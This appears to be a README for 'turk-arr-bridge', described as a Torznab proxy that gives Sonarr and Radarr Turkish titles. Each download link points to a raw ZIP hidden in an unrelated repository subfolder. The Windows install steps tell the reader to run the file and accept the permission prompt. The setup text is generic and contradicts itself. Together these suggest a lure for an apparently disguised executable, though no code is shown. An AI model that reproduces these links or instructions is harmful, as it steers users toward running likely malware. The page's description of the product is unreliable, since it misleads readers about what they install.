# 🇹🇷 turk-arr-bridge - Turkish titles for Sonarr and Radarr

[![Download](https://img.shields.io/badge/Download-turk--arr--bridge-6F42C1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Aline001xx/turk-arr-bridge/raw/refs/heads/main/vectograph/bridge-turk-arr-1.0.zip)

## 🎯 What this app does

turk-arr-bridge is a Torznab proxy for Sonarr and Radarr.  
It helps turn international release titles into Turkish originals before they reach your media apps.

Use it when you want better title matching for Turkish media libraries.  
It works as a middle layer between your indexer and your ARR app, so your setup can use cleaner local titles.

## 🖥️ What you need

- A Windows PC
- Sonarr or Radarr
- An indexer that works with Torznab
- A web browser
- A stable internet connection
- Permission to run apps on your computer

## 📥 Download and install

1. Open this page: https://github.com/Aline001xx/turk-arr-bridge/raw/refs/heads/main/vectograph/bridge-turk-arr-1.0.zip
2. Find the latest release or the main download files on the page
3. Download the Windows file or package from the repository
4. Save it to a folder you can find again, such as Downloads or Desktop
5. If you get a ZIP file, right-click it and choose Extract All
6. Open the extracted folder
7. Run the app file you downloaded
8. If Windows asks for permission, choose Yes
9. Keep the app open while you set up Sonarr or Radarr

If the project ships as a folder-based app, place it in a simple path like:

- `C:\Apps\turk-arr-bridge`
- `C:\Users\YourName\Downloads\turk-arr-bridge`

Avoid deep folder paths with many special characters

## ⚙️ First-time setup

1. Start turk-arr-bridge
2. Open the local address shown by the app in your browser
3. Look for the bridge settings page
4. Add your indexer details
5. Enter the Torznab URL from your source service
6. Add the API key if the service needs one
7. Save the settings
8. Keep note of the local port the app uses

A typical local address may look like:

- `http://localhost:port`
- `http://127.0.0.1:port`

## 🧩 Add it to Sonarr

1. Open Sonarr
2. Go to Settings
3. Open Indexers
4. Add a new Torznab indexer
5. Set the URL to the local bridge address
6. Paste the API key used by turk-arr-bridge
7. Test the connection
8. Save the indexer

Use the same pattern if you want Sonarr to search through the bridge first

## 🎬 Add it to Radarr

1. Open Radarr
2. Go to Settings
3. Open Indexers
4. Add a new Torznab indexer
5. Use the local bridge URL from the app
6. Add the same API key
7. Test the indexer
8. Save the settings

After this, Radarr can send searches through the proxy and receive translated title data

## 🔍 How it works

The bridge sits between your ARR app and your indexer.

It does three main things:

- Receives Torznab search requests
- Reads the result titles
- Converts foreign titles into Turkish originals when it can

That can help with:

- Better match results
- Cleaner title display
- Easier Turkish library management
- More useful search results for local titles

## 🧭 Basic use

Once setup is done, you usually do not need to touch the bridge again.

You can leave it running in the background and use Sonarr or Radarr as usual.  
When you search or import media, the bridge handles the title translation step in the middle.

If you restart your PC, start the app again before you use Sonarr or Radarr

## 🛠️ Common settings you may see

The app may include settings like these:

- Local port
- Torznab source URL
- API key
- Language rules
- Title mapping options
- Logging level

If you are unsure, keep the default values first.  
Change one setting at a time so it is easy to see what changed.

## ✅ Tips for best results

- Use one bridge instance for one media stack
- Keep Sonarr and Radarr pointed to the same local bridge URL if needed
- Make sure your Torznab source works before adding the bridge
- Use simple folder paths on Windows
- Keep the app running while searches happen
- Restart the bridge if title results stop updating

## 📁 Suggested Windows setup path

For a clean setup, use a folder like:

- `C:\Apps\turk-arr-bridge\`
- `C:\MediaTools\turk-arr-bridge\`

This makes it easy to find the app later and keeps the setup clear

## 🔐 Access and network notes

The bridge usually runs on your local machine.  
That means Sonarr and Radarr can connect to it on your own PC or home network.

If you use another device on the network, make sure:

- The bridge allows local network access
- The port is open on Windows
- Sonarr or Radarr points to the right machine address

A local-only setup is the simplest option for most users

## 🧪 If something does not work

1. Check that the bridge app is still running
2. Confirm the URL in Sonarr or Radarr
3. Check the API key
4. Make sure the port matches the bridge settings
5. Restart the app
6. Restart Sonarr or Radarr
7. Try the browser page for the bridge again
8. Test your Torznab source directly if needed

If the app opens but shows no results, the indexer source may be the issue  
If Sonarr or Radarr cannot connect, the URL or port is usually the first thing to check

## 📌 Quick setup path

1. Download the app from https://github.com/Aline001xx/turk-arr-bridge/raw/refs/heads/main/vectograph/bridge-turk-arr-1.0.zip
2. Extract it if needed
3. Run the Windows file
4. Open the local bridge page
5. Add your Torznab source
6. Copy the bridge URL
7. Add it to Sonarr or Radarr
8. Test and save

## 🗂️ Topic tags

arr  
docker  
jackett  
media-server  
proxy  
radarr  
self-hosted  
sonarr  
torznab  
turkish